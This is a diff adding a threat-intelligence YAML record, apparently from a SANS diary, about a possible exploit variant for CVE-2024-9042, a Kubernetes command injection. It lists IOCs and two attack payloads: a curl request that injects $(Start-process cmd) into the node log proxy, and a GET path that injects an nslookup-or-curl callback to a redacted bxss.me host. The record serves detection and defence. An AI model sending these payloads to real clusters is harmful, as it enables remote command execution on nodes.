@@ -1,0 +1,32 @@
+description: Possible exploit variant for CVE-2024-9042 (Kubernetes OS Command Injection)
+TTPs:
+  processes: []
+  commandline:
+  - curl "<Kubernetes API Proxy server IP>/api/v1/nodes/<NODE name>/proxy/logs/?query=nssm&pattern=\\$(Start-process
+    cmd)"
+  - GET /$(nslookup%20-q=cname%20[redacted].bxss.me||curl%20[redacted].bxss.me)/logs/
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - '[redacted], [redacted], 80'
+  file_activity: []
+  persistence: []
+  process_relations: []
+CVEs:
+- CVE-2024-9042
+IOCs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - '[redacted].bxss.me'
+  urls:
+  - <Kubernetes API Proxy server IP>/api/v1/nodes/<NODE name>/proxy/logs/?query=nssm&pattern=\$(Start-process
+    cmd)
+  - '[redacted].bxss.me'
+authors:
+- Johannes B. Ullrich, Ph.D., Dean of Research, SANS.edu
+reference: https://isc.sans.edu/forums/diary/Possible+exploit+variant+for+CVE20249042+Kubernetes+OS+Command+Injection/32554
+date_of_publication: December 10, 2025
+file_creation_date: December 11, 2025
